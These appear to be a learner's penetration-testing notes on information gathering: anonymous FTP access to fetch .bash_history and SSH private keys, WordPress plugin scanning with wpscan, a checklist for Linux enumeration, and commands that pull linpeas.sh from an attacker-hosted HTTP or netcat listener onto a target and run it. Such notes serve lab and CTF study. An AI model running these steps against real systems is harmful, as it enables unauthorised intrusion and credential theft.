# Information Gathering
### FTP
FTP is a basic method for moving files between computers over a network—think of it as a digital courier service. It allows you to upload files to a remote computer (like sending packages) or download files from it (like receiving packages).
```
ftp [IP] 21
```
anonymous:anonymous

#### Information Gathering in FTP
ls -la
get (file name)
ls -al

important for clues
get .bash-history
get .ssh

ssh directory
**id_rsa** is the private key that should be kept secret and never shared
**id_rsa.pub** is the public key that can be shared with other systems

#### Information Gathering in Wordpress
We'll enumerate plugins (-e p), skip TLS checks (--disable-tls-checks), set the plugin detection mode to passive (--plugins-detection passive), and use 100 threads (-t 100) to speed up the enumeration.
```
wpscan -e p --url https://10.129.12.10 --disable-tls-checks --no-banner --plugins-detection passive -t 100
```

#### Linux System Enumeration

- System Information: OS version, kernel version, architecture, and installed patches

- User Information: Current user privileges, all users on the system, sudo rights

- Network Information: Network interfaces, routing tables, active connections

- Running Services: Active processes, listening ports, scheduled tasks

- File System: Interesting files, permissions issues, mounted drives

- Installed Software: Applications, versions, potential vulnerabilities

- Security Mechanisms: Firewall rules, SELinux status, AppArmor profiles

### ✅ 1. **Using `wget` or `curl` (recommended)**

If the target has internet access, **host `linpeas.sh` locally** and download it from the target:

#### Step A: Start a simple HTTP server on your machine (local):

In the directory where `linpeas.sh` is located, run:
python3 -m http.server 8000
Step B: On the target machine, run either:
wget http://<your_ip>:8000/linpeas.sh

### ✅ 3. **Using Netcat (nc)**

#### Step A: On your machine (attacker), run:
nc -lvnp 4444 < linpeas.sh
Step B: On the target:
nc <your_ip> 4444 > linpeas.sh
chmod +x linpeas.sh

✅ 4. **Using SCP (if SSH is accessible and you have credentials)**
scp linpeas.sh user@target:/tmp/

After Transfer:
chmod +x linpeas.sh
./linpeas.sh
